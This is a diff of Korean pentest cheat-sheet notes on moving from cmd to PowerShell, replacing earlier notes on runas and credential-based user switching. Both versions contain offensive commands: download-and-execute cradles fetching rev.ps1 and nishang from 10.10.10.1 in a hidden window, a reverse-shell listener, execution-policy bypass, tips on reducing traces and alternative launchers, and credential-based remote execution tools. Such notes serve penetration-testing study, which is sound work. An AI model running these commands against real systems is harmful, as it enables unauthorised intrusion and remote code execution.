@@ -1,119 +1,54 @@
-# 사용자 전환 — runas / 자격증명 실행 (Windows)
+# cmd에서 PowerShell로 전환
 
-- 열거로 확보한 패스워드로 다른 계정(RID 500 등) 컨텍스트 셸을 얻는 사용자 전환 기법 모음(runas, schtasks, PowerShell PSCredential, 콜백 리버스 셸)
-- 다른 계정의 패스워드를 확보했을 때, 세션 종류가 갈림길이다 — 콘솔·RDP(창 있음)는 runas, WinRM·리버스 셸(창 없음)은 파일 출력·schtasks·콜백으로
-- 대상 계정의 유효한 패스워드 필요, runas는 창 없는 세션에서 프롬프트가 안 보이므로 우회 필요, cmdkey /list에 저장 크리덴셜이 있으면 /savecred로 패스워드 없이 가능, UAC 원격 토큰 필터링도 실패 원인이다
+- powershell.exe — cmd 셸에서 PowerShell을 호출하는 명령. 인자 없이 실행하면 대화형 셸로 전환되고, -Command로 한 줄 실행, -ExecutionPolicy Bypass로 스크립트 실행 제한을 우회해 ps1 파일을 돌린다.
+- cmd만 확보됐을 때 .NET 호출, Invoke-WebRequest, AD 모듈, Get-Content 파이프라인 같은 PowerShell 전용 기능이 필요할 때. 스크립트 파일을 내려받아 바로 실행할 때.
+- Windows에 기본 내장. PowerShell 2.0 이상이면 -ExecutionPolicy Bypass가 동작하고 cmd에서 실행 권한만 있으면 된다.
 
-한 줄 요약: 열거로 확보한 패스워드로 다른 계정(RID 500 등) 컨텍스트의 쉘을 얻는 기법.
-쉘 종류가 갈림길이다. 콘솔/RDP(창 있음) → runas로 끝. WinRM·리버스 쉘(창 없음) → 파일 출력 또는 콜백.
-
-> 관련 문서: [Windows 권한 치트시트](./windows_privileges.md) · [evil-winrm](./evil-winrm.md)
-
-## 사전 확인
+## 대화형 전환
 
 ```cmd
-whoami
-cmdkey /list
+powershell
+powershell -ep bypass
 ```
 
-- winPEAS 사용자 정보에서 RID 500이면 내장 Administrator. 패스워드 후보가 나오면 이 계정부터 시도.
-- `cmdkey /list`에 저장된 크리덜이 보이면 `/savecred` 남용이 바로 가능.
+- 인자 없이 powershell만 치면 즉시 대화형 PowerShell 프롬프트(PS C:\>)로 전환되고, exit로 cmd로 되돌아온다.
+- `-ep bypass`(-ExecutionPolicy Bypass의 축약)는 스크립트 실행 정책을 우회하는 플래그로, ps1 파일 실행 앞에 붙이는 표준형이다.
 
-## 콘솔/RDP(창 있는 세션)면: runas
+## 한 줄 실행(one-liner)
 
 ```cmd
-runas /user:Administrator cmd.exe
+powershell -c "Get-Process | Select-Object -First 5"
+powershell -c "(Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon').DefaultUserName"
+powershell -nop -w hidden -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.1/rev.ps1')"
 ```
 
-- 플래그는 `/user:`다. `/usr:`은 없는 옵션이라 usage만 출력된다.
-- 패스워드는 콘솔에서 직접 입력받는다. 파이프·리다이렉션 전달 불가.
-- 성공 판정: `RUNAS ERROR`가 안 붙고 `Attempting to start cmd as user ...` 뒤로 프롬프트가 돌아오면 로그온·프로세스 생성 모두 성공. 새 cmd 창이 열린다.
-- 로컬 계정 명시: `runas /user:.\Administrator cmd.exe`
-- 플래그: `/profile`(프로필 로드, 기본), `/env`(현재 환경 유지), `/netonly`(도메인 크리덜 원격 전용)
+- `-c`(-Command): 실행 후 cmd로 복귀하는 한 번성 실행이다.
+- `-nop`(-NoProfile): 프로파일 로드를 생략해 속도를 높이고 흔적을 줄인다. `-w hidden`(-WindowStyle Hidden): 창을 숨긴다.
+- `-enc`(-EncodedCommand): base64(UTF-16LE)로 인코딩한 명령을 넘겨 인용문 충돌을 피한다. Linux에서는 `iconv -f utf-8 -t utf-16le | base64 -w0`로 만든다.
 
-### 저장된 크리덜로 패스워드 없이 실행
+## 스크립트 파일 실행
 
 ```cmd
-runas /savecred /user:USER "cmd.exe /c whoami > C:\temp\out.txt"
+powershell -ep bypass -f C:\Windows\Temp\winPEAS.ps1
+powershell -ep bypass -c "& 'C:\Windows\Temp\script.ps1'"
 ```
 
-## 창 없는 세션(WinRM·evil-winrm·리버스 쉘)이면
+- `-f`(-File): 스크립트 파일을 직접 실행한다. Restricted 정책 환경에서는 -ExecutionPolicy Bypass가 함께 있어야 실행된다.
 
-runas는 프로세스를 별도 콘솔로 띄우는데, 세션에 데스크톱이 없으면 붙일 곳이 없다.
-실행은 되지만 눈에 안 보이고 입력·출력이 안 이어진다. 세션 안에서 프롬프트만 바뀌는 전환은 불가능하다고 보면 된다.
-
-### 방법 1 — 출력을 파일로 빼서 읽기 (파일 확인이 목적일 때)
+## 실전 예시
 
 ```cmd
-runas /user:Administrator "cmd.exe /c dir C:\Users\Administrator\Desktop > C:\Users\Jeff\out.txt 2>&1"
-type C:\Users\Jeff\out.txt
+:: 파일 다운로드 후 실행까지 cmd에서 한 번에
+powershell -ep bypass -c "IWR 'http://10.10.10.1/nishang.ps1' -OutFile C:\Windows\Temp\n.ps1; & C:\Windows\Temp\n.ps1"
+
+:: 가벼운 포트 확인 one-liner
+powershell -c "Test-NetConnection 10.10.10.10 -Port 445"
 ```
 
-### 방법 2 — schtasks (서비스 계정 쉘이면 이게 제일 확실)
+- IWR은 Invoke-WebRequest의 별칭이며, 다운로드와 실행을 -c 한 줄로 묶는 패턴이 가장 흔하다.
 
-```cmd
-schtasks /create /f /tn t1 /tr "cmd /c whoami > C:\Users\Jeff\out.txt" /sc once /st 23:59 /ru Administrator /rp PASSWORD
-schtasks /run /tn t1
-type C:\Users\Jeff\out.txt
-schtasks /delete /f /tn t1
-```
+## 팁·트러블슈팅
 
-- `/ru` 실행 계정, `/rp` 그 계정의 패스워드. `/tr` 안에서 리다이렉션이 필요하면 `cmd /c`로 감싼다.
-
-### 방법 3 — PowerShell 자격증명 객체
-
-```powershell
-$pass = ConvertTo-SecureString 'PASSWORD' -AsPlainText -Force
-$cred = New-Object System.Management.Automation.PSCredential('.\Administrator', $pass)
-Start-Process -FilePath 'cmd.exe' -Credential $cred
-```
-
-- 새 창을 필요로 해서 콘솔/RDP에서만 안정적. 창 없는 세션에선 방법 1·2로.
-
-### 방법 4 — 대화형 쉘이 필요하면 콜백으로 받는다
-
-WinRM 세션 안에서 프롬프트가 바뀌는 전환은 불가능하니, 대상 계정 컨텍스트로 리버스 쉘을 띄워 Kali 리스너로 받는다.
-
-1. Kali에서 리스너: `rlwrap nc -lvnp 4444`
-2. 리버스 쉘 스크립트(rev.ps1)를 대상에 업로드
-3. 실행:
-
-```cmd
-runas /user:Administrator "cmd.exe /c powershell -ep bypass -File C:\Users\Jeff\rev.ps1"
-```
-
-```cmd
-schtasks /create /f /tn t1 /tr "powershell -ep bypass -File C:\Users\Jeff\rev.ps1" /sc once /st 23:59 /ru Administrator /rp PASSWORD
-schtasks /run /tn t1
-```
-
-- 리스너에 떨어진 쉘에서 `whoami`로 전환 확인.
-- meterpreter 세션이면 토큰 스왑이 가능하다: `load incognito` 후 `impersonate_token HOST\Administrator`
-
-## 이미 High Integrity(관리자)면 패스워드 리셋도 방법
-
-```cmd
-net user Administrator NewPass123!
-```
-
-- 흔적이 남고 기존 세션·인증을 깨뜨릴 수 있어 최후 수단.
-
-## 패스워드가 유효하면 쉘 전환보다 원격 접속이 최단일 때 (Kali)
-
-```bash
-crackmapexec smb 192.168.80.200 -u Administrator -p 'PASSWORD'   # (Possible)Pwn3d! 확인
-evil-winrm -i 192.168.80.200 -u Administrator -p 'PASSWORD'
-psexec.py Administrator:'PASSWORD'@192.168.80.200
-wmiexec.py Administrator:'PASSWORD'@192.168.80.200
-xfreerdp /u:Administrator /p:'PASSWORD' /v:192.168.80.200 /dynamic-resolution
-```
-
-- 같은 계정이라 경로(RDP·WinRM·SMB·WMI)마다 성공 여부가 다르다. 여러 개를 돌려본다.
-
-## 흔한 실패와 원인
-
-- 프롬프트 없이 멈춤: 비대화형 쉘에서 runas 시도. 방법 1~4로 전환.
-- 프롬프트가 돌아왔는데 새 창이 안 보임: 창 없는 세션. 방법 1~4로.
-- `Logon failure: unknown user name or bad password`: 계정명·도메인 확인. 로컬 계정이면 `.\`를 붙여본다.
-- `The directory name is invalid`: 해당 사용자의 프로필 디렉터리 없음. schtasks·Start-Process로 우회.
-- 원격 로그온한 로컬 관리자인데 권한이 낮게 보임: UAC 원격 토큰 필터링(RID 500은 기본 예외). 콘솔·schtasks 경로로 우회.
+1. 스크립트 실행을 사용할 수 없습니다 오류는 실행 정책이 Restricted라는 뜻으로, -ep bypass를 빼먹은 경우다.
+2. powershell.exe 자체가 차단된 환경이면 pwsh(PowerShell 7) 존재 여부나 msbuild·rundll32 같은 대체 실행 경로를 확인한다.
+3. 대화형 전환 후에는 프롬프트 접두사(PS C:\>)로 셸이 바뀌었는지 확인한다. cmd 문법(dir /s /b, findstr)은 대부분 동작하지만 파이프 동작과 별칭이 다르다.
